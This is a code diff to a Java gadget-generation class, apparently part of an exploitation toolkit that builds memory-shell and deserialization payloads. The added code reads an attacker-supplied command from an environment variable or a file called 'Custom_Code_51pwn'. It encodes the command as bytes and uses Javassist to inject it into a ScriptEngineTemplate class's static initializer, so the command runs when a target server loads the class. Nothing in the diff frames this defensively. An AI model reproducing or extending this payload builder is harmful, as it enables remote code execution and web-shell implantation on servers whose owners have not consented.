@@ -163,6 +163,48 @@ public class Gadgets {
                 ctClass.setName(SpringInterceptorMemShell.class.getName() + System.nanoTime());
                 classBytes = ctClass.toBytecode();
             } else {
+                if(myClass.getName().contains("ScriptEngineTemplate")){
+                    String cmd = "";
+                    String szInjecting = "Custom_Code_51pwn";
+                    String szEvCmd = System.getenv(szInjecting);
+                    if(""!=szEvCmd){
+                        cmd = szEvCmd;
+                    }
+                    // # 2 file
+                    File file = new File(szInjecting);
+                    if(file.exists()){
+                        byte[] bytes1 = new byte[(int) file.length()];
+                        FileInputStream fis = null;
+                        try{
+                            fis = new FileInputStream(file);
+                            if (0 < fis.read(bytes1)) {
+                                cmd = new String(bytes1);
+                            }
+                        }catch (Exception e){}
+                        finally {
+                            if(null !=fis){
+                                try {
+                                    fis.close();
+                                } catch (Exception e) {
+                                }
+                            }
+                        }
+                    }
+                    if(""!=cmd){
+                        byte[] byteArray = cmd.getBytes();
+                        StringBuilder sb = new StringBuilder();
+                        sb.append("new String(new byte[]{");
+                        for (int i = 0; i < byteArray.length; i++) {
+                            sb.append(byteArray[i]);
+                            if (i != byteArray.length - 1) {
+                                sb.append(", ");
+                            }
+                        }
+                        sb.append("});");
+                        String cmd1 = "cmd = "+sb.toString();
+                        ctClass.makeClassInitializer().insertBefore(cmd1);
+                    }
+                }
                 // 其他的TomcatFilterMemShellFromThread这种可以直接加载 需要随机命名类名
                 ctClass.setName(myClass.getName() + System.nanoTime());
                 classBytes = ctClass.toBytecode();
